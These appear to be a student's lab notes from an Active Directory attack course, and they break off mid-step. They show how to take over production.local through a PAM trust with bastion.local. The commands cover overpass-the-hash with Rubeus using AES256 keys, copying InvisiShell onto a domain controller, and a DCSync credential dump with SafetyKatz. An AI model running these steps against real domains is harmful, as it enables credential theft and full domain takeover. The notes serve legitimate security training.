
Task 

• Compromise production.local by abusing PAM trust between bastion.local and production.local

First, we need to compromise bastion.local. We have DA on techcorp.local that has a two-way trust with bastion.local. Let's enumerate Foreign Security Principals on bastion.local to check if there is anything interesting. Using the Active Directory module from InvisiShell:

ADmodule

```
 Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
```

![[Pasted image 20250325183014.png]]

So, the DA of techcorp.local is a part of a group on bastion.local. To find out which group it is a member of, run the below command:

```
Get-ADGroup -Filter * -Properties Member -Server bastion.local | ?{$_.Member -match 'S-1-5-21-2781415573-3701854478-2406986946-500'}
```

![[Pasted image 20250325183232.png]]

Sweet! The administrator of techcorp.local is a member of the built-in administrators group on bastion.local. 

That makes things simple! Let's access bastion-dc as administrator. Run the below command from an elevated shell on the student VM to use Overpass-the-hash:

```
echo %Pwn% asktgt
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /domain:techcorp.local /user:administrator /aes256:58db3c598315bf030d4f1f07021d364ba9350444e3f391e167938dd998836883 /dc:techcorp-dc.techcorp.local /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\bastion-dc.bastion.local\C$\Users\Public\InShellProf.dll /Y
```

```
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\bastion-dc.bastion.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
```

```
winrs -r:bastion-dc.bastion.local cmd
```


```
C:\Users\Public\RunWithRegistryNonAdmin.bat
```

Check if PAM trust is enabled. First enumerate trusts on bastion.local. Because we are already on a domain controller, we can use the Active Directory module:

```
Get-ADTrust -Filter {(ForestTransitive - eq $True) -and (SIDFilteringQuarantined -eq $False)}
```

![[Pasted image 20250325210239.png]]

Once we know that there is a ForestTransitive trust and SIDFIlteringForestAware is false, enumerate trusts on production.local to be sure of PAM trust in use. If we try to access production.local from the session on bastion.local we will face the double hop issue, so we need to use Overpass-the-hash Administrator of bastion.local. First, we will use the privileges of domain administrator of techcorp.local to extract credentials of domain administrator for bastion.local. Use the below command in the command prompt that we used above:


```
echo %Pwn% lsadump::dcsync
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe - args "%Pwn% /user:bastion\Administrator /domain:bastion.local" "exit"
```

![[Pasted image 20250325210603.png]]

Run the below command from an elevated shell on the student VM to use Overpass-the-hash and start a process with the privileges of domain administrator of bastion.local:

```
echo %Pwn% asktgt
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe - args %Pwn% /domain:bastion.local /user:administrator /aes256:a32d8d07a45e115fa499cf58a2d98ef5bf49717af58bc4961c94c3c95fc03292 /dc:bastion-dc.bastion.local /createnetonly:C:\Windows\System32\cmd.exe /show
```
In the new process, use the below commands to copy and use InvisiShell:


![[Pasted image 20250325212345.png]]

```
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
```

![[Pasted image 20250325212419.png]]

So we now know that SID History is allowed for access from bastion.local to production.local. Check the membership of Shadow Security Principals on bastion.local:


```
$SearchBase = "CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext
```

```
Get-ADObject -SearchBase $SearchBase -Filter * -Properties * | Select Name, Member, msDS-ShadowPrincipalSid | Format-List
```

![[Pasted image 20250325215723.png]]

```
Get-DnsServerZone -ZoneName production.local |fl *
```

![[Pasted image 20250325215745.png]]

To use PowerShell Remoting to connect to an IP address, we must modify the WSMan Trustedhosts property on the student VM. Run the below command in an elevated PowerShell on the student VM:

